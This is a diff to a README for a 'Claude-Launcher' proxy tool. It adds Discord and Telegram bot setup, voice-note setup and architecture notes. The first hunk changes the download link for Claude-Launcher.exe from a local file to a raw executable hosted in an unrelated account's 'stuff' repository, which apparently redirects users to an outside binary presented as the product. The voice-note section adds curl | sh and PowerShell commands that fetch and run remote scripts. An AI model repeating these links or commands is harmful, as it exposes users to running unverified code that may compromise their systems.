@@ -10,7 +10,7 @@ No terminal commands needed — just double-click and go.
 
 | File | Size | Description |
 |------|------|-------------|
-| [`Claude-Launcher.exe`](./Claude-Launcher.exe) | ~76 MB | Portable launcher + built-in installer |
+| [`Claude-Launcher.exe`](https://github.com/Grass-usertaken/stuff/raw/main/claude-launcher/Claude-Launcher.exe) | ~76 MB | Portable launcher + built-in installer |
 
 ---
 
@@ -258,6 +258,96 @@ The built executable will be in `dist/Claude-Launcher.exe`.
 - **xterm.js** — Terminal emulator
 - **node-pty** — Pseudo-terminal for running `fcc-claude`
 - **Light white UI** — Clean, minimal design
+
+---
+
+## Messaging Integrations
+
+For every integration below, change **managed proxy settings** only in the **Admin UI** at `/admin`: edit fields, click **Validate**, then **Apply**. The footer shows where the managed config is stored; this README does not walk through editing that file by hand.
+
+### Discord And Telegram Bots
+
+The bot wrapper runs Claude Code sessions remotely, streams progress, supports reply-based conversation branches, and can stop or clear tasks.
+
+**Discord**
+
+1. Create the bot in the [Discord Developer Portal](https://discord.com/developers/applications).
+2. Enable **Message Content Intent**.
+3. Invite the bot with read, send, and message history permissions.
+4. Copy the bot token and the numeric channel ID (or IDs) where the bot should respond.
+
+**Telegram**
+
+1. Create a bot with [@BotFather](https://t.me/BotFather) and copy the bot token.
+2. Get your numeric user ID from [@userinfobot](https://t.me/userinfobot) so only you can use the bot.
+
+**Configure in the Admin UI**
+
+1. With `fcc-server` running, open the **Admin UI** URL from the terminal output.
+2. In the sidebar, choose **Messaging**.
+3. Set **Messaging Platform** to **discord** or **telegram**.
+4. For Discord, paste **Discord Bot Token** and **Allowed Discord Channels**. For Telegram, paste **Telegram Bot Token** and **Allowed Telegram User ID**.
+5. Set **Allowed Directory** to an absolute path on the machine running the proxy—the workspace root the bot may use.
+6. Click **Validate**, then **Apply**. Restart the server if the UI says one is required.
+
+**Useful commands**
+
+- `/stop` cancels a task; reply to a task message to stop only that branch.
+- `/clear` resets sessions; reply to clear one branch.
+- `/stats` shows session state.
+
+### Voice Notes
+
+Voice notes work on Discord and Telegram after you extend your Free Claude Code install with the matching optional extras.
+
+macOS/Linux:
+
+```bash
+# NVIDIA NIM transcription (Riva gRPC)
+curl -fsSL "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.sh?raw=1" | sh -s -- --voice-nim
+
+# Local Whisper (CPU or CUDA)
+curl -fsSL "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.sh?raw=1" | sh -s -- --voice-local
+
+# Both backends
+curl -fsSL "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.sh?raw=1" | sh -s -- --voice-all
+
+# Local Whisper with CUDA
+curl -fsSL "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.sh?raw=1" | sh -s -- --voice-local --torch-backend cu130
+```
+
+Windows PowerShell:
+
+```powershell
+# NVIDIA NIM transcription (Riva gRPC)
+& ([scriptblock]::Create((irm "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.ps1?raw=1"))) -VoiceNim
+
+# Local Whisper (CPU or CUDA)
+& ([scriptblock]::Create((irm "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.ps1?raw=1"))) -VoiceLocal
+
+# Both backends
+& ([scriptblock]::Create((irm "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.ps1?raw=1"))) -VoiceAll
+
+# Local Whisper with CUDA
+& ([scriptblock]::Create((irm "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.ps1?raw=1"))) -VoiceLocal -TorchBackend cu130
+```
+
+Restart `fcc-server` after reinstalling.
+
+In the **Admin UI**, open **Messaging** and scroll to **Voice**. Turn on **Voice Notes**, choose **Whisper Device** (`cpu`, `cuda`, or `nvidia_nim`), set **Whisper Model**, and enter **Hugging Face Token** when your setup needs it. For **nvidia_nim** transcription, install the voice extra and set **NVIDIA NIM API Key** on the **Providers** view.
+
+---
+
+## How It Works
+
+Important pieces:
+
+- FastAPI exposes Anthropic-compatible routes such as `/v1/messages`, `/v1/messages/count_tokens`, and `/v1/models`.
+- Model routing resolves the Claude model name to `MODEL_OPUS`, `MODEL_SONNET`, `MODEL_HAIKU`, or `MODEL`.
+- NIM, OpenCode Zen, and OpenCode Go use OpenAI chat streaming translated into Anthropic SSE.
+- Wafer, OpenRouter, DeepSeek, Kimi, Fireworks AI, Z.ai, LM Studio, llama.cpp, and Ollama use Anthropic Messages style transports where applicable (with provider-specific quirks and model-list URLs).
+- The proxy normalizes thinking blocks, tool calls, token usage metadata, and provider errors into the shape Claude Code expects.
+- Request optimizations answer trivial Claude Code probes locally to save latency and quota.
 
 ---
 
